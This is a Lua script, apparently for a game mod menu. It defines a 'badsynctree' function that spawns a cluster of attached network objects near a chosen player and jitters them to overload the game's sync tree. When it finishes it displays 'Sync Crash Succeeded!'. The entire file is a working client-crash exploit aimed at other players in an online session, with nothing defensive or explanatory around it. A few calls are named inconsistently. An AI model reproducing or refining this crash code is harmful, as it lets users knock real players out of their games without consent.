function badsynctree()
    local pid = g_util.get_selected_player()
	if player.is_player_valid(pid) then
        local objectHash = 1352295901
		STREAMING.REQUEST_MODEL(objectHash)
		while not STREAMING.HAS_MODEL_LOADED(objectHash) do
			g_util.yield()
		end
        local playerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
		local sync_tree_children_hashes = {849958566, -568220328, 2155335200, 1272323782, 1296557055, 29828513, 2250084685, 2349112599, 1599985244, 3523942264, 3457195100, 3762929870, 1016189997, 861098586, 3613262246, 3245733464, 2494305715, 671173206, 3769155529, 978689073, 100436592, 3107991431, 1327834842, 1239708330}
		local sync_tree_children = {}
		local main_sync_handler = OBJECT.CREATE_WORLD_OBJECT(objectHash, playerCoords.x +300, playerCoords.y+300, playerCoords.z+300, true, false)
		NETWORK.REQUEST_CONTROL_OF_ENTITY(main_sync_handler)
		for i = 1, #sync_tree_children_hashes do
            STREAMING.REQUEST_MODEL(sync_tree_children_hashes[i])
                while not STREAMING.HAS_MODEL_LOADED(sync_tree_children_hashes[i]) do
                    g_util.yield()
                end
			sync_tree_children[i] = OBJECT.CREATE_WORLD_OBJECT(sync_tree_children_hashes[i], playerCoords.x +300, playerCoords.y+300, playerCoords.z+300, true, false)
			NETWORK.REQUEST_CONTROL_OF_ENTITY(sync_tree_children[i])
			ENTITY.ATTACH_ENTITY_TO_ENTITY(sync_tree_children[i], main_sync_handler, 0, 0, 0, 0, 0, 0, 0, 2, true, true, false, 0, false)
		end
		local time = g_os.time_ms() + 2000
		while time > g_os.time_ms() do
			SYSTEM.YIELD(math.random(0, 10))
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(main_sync_handler, playerCoords.x + math.random(-1, 1), playerCoords.y+ math.random(-1, 1), playerCoords.z+ math.random(-1, 1))
		end
		NETWORK.REQUEST_CONTROL_OF_ENTITY(main_sync_handler)
		if ENTITY.IS_AN_ENTITY(main_sync_handler) then
            Entity = get_parent_of_attachments(main_sync_handler)
            if ENTITY.IS_AN_ENTITY(Entity) and (not ENTITY.IS_ENTITY_A_PED(Entity) or not PED.IS_PED_A_PLAYER(Entity)) then
                clear_entities({Entity})
            end
        end
		for i = 1, #sync_tree_children do
			if ENTITY.IS_AN_ENTITY(sync_tree_children[i]) then
                while ENTITY.IS_AN_ENTITY(sync_tree_children[i]) and not NETWORK.HAS_CONTROL_OF_ENTITY(sync_tree_children[i]) and time > utils.time_ms() do
                    system.yield(0)
                    NETWORK.REQUEST_CONTROL_OF_ENTITY(sync_tree_children[i])
                end
				if ENTITY.IS_AN_ENTITY(sync_tree_children[i]) then
                    syncEntity = get_parent_of_attachments(sync_tree_children[i])
                    if ENTITY.IS_AN_ENTITY(syncEntity) and (not ENTITY.IS_ENTITY_A_PED(syncEntity) or not PED.IS_PED_A_PLAYER(syncEntity)) then
                        clear_entities({syncEntity})
                    end
                end
			end
		end
		g_util.add_toast("Sync Crash Succeeded!")
	else
		g_util.add_toast("Invalid Player!")
	end
end
